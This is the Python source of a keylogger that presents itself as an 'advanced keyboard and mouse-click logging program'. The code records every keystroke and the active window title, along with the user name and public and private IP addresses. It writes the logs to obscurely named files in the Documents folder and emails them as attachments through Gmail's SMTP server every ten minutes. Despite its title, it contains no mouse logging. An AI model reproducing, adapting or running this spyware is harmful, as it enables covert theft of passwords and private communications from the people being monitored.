"""
ADVANCED KEYBOARD AND MOUSE-CLICK LOGGING PROGRAM
by Adam Stebbing
1/26/2019

Required Modules: Pywin32, Requests, Pynput
"""
from pynput.keyboard import Key, Listener
import os
import random
import requests
import smtplib
import socket
import threading
import time
import win32gui
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import config # Config file with your email info and password

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
test = os.path.expanduser('~')
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\nDate/Time: {datetime}\nUser-Profile: {user}\nPublic-IP: {publicIP}\nPrivate-IP: {privateIP}\n\n'
log = []
log.append(msg)

print(log)

old_app = ''
delete_file = []

def on_press(input):
    global old_app

    # Record what application is currently open
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    # Add note in logs if the application changes
    if new_app != old_app and new_app != '':
        log.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app

    # Substitute input for readability and add it to the log
    sub_list = {'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
	'Key.alt_l': '[ALT]', 'Key.alt_r': '[ALT]', 'Key.tab': '[TAB]', 'Key.delete': '[DEL]',
    'Key.ctrl_l': '[CTRL]', 'Key.ctrl_r': '[CTRL]',	'Key.left': '[LEFT ARROW]',
    'Key.right': '[RIGHT ARROW]', 'Key.shift': '[SHIFT]', '\\x13': '[CTRL-S]', '\\x17':
    '[CTRL-W]', 'Key.caps_lock': '[CAPS LOCK]', '\\x01': '[CTRL-A]', 'Key.cmd':
    '[WINDOWS KEY]', 'Key.print_screen': '[PRNT SCREEN]', '\\x03': '[CTRL-C]',
    '\\x16': '[CTRL-V]'}
    input = str(input).strip('\'')
    if input == "\"\'\"":
        input = "\'"
    # Add readbility improvement for Key.shift_r

    if input in sub_list:
        log.append(sub_list[input])
    else:
        log.append(input)

"""
Writes the log file to a random location with the order number of the log
followed by an I (which looks like a 1) and random numbers to confuse possible
readers.
"""
def write_file(count):
    # Add section for if Linux, if Windows
    x = os.path.expanduser('~') + '\\Documents\\'
    y = os.path.expanduser('~') + '\\Pictures\\'
    z = os.path.expanduser('~') + '\\Music\\'
    list = [x] #, y, z]
    filepath = list[0] # random.choice(list)
    filename = str(count) + '454545' + str(random.randint(10000000, 99999999)) + '.txt'
    file = filepath + filename
    delete_file.append(file)

    print(filename)
    with open(file, 'w') as fp:
        fp.write(''.join(log))

def send_logs():
    count = 0
    fromAddr = config.fromAddr
    fromPswd = config.fromPswd
    toAddr = fromAddr

    while True:
        if len(log) > 1:
            # Set how often the emails are sent (in seconds), default is 6 minutes
            time.sleep(600)

            write_file(count)
            msg = MIMEMultipart()
            msg['From'] = fromAddr
            msg['To'] = toAddr
            msg['Subject'] = f'[{user}] Log:{count}'
            body = 'testing'
            msg.attach(MIMEText(body, 'plain'))

            attachment = open(delete_file[0], 'rb')
            filename = delete_file[0].split('\\')[2]
            print(filename)

            email = MIMEBase('application', 'octet-stream')
            email.set_payload((attachment).read())
            encoders.encode_base64(email)
            email.add_header('content-disposition', 'attachment;filename='+str(filename))
            msg.attach(email)
            text = msg.as_string()
            print(attachment)

            # Send logs via email
            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(fromAddr, fromPswd)
                server.send_message(msg)
                #server.sendmail(fromAddr, toAddr)
                print("fail4")
                attachment.close()
                server.close()
                print("made it")
            except:
                print("\n\nCant get to server")
                print("Cant get to server")
                print("Cant get to server\n\n")

            """# Delete logs
            os.remove(delete_file[0])
            del log[1:]
            del delete_file[0:]"""

            count += 1
        else:
            pass

# Prevent file from being imported
if __name__=='__main__':
    t1 = threading.Thread(target=send_logs)
    t1.start()
    with Listener(on_press=on_press) as listener:
        listener.join()
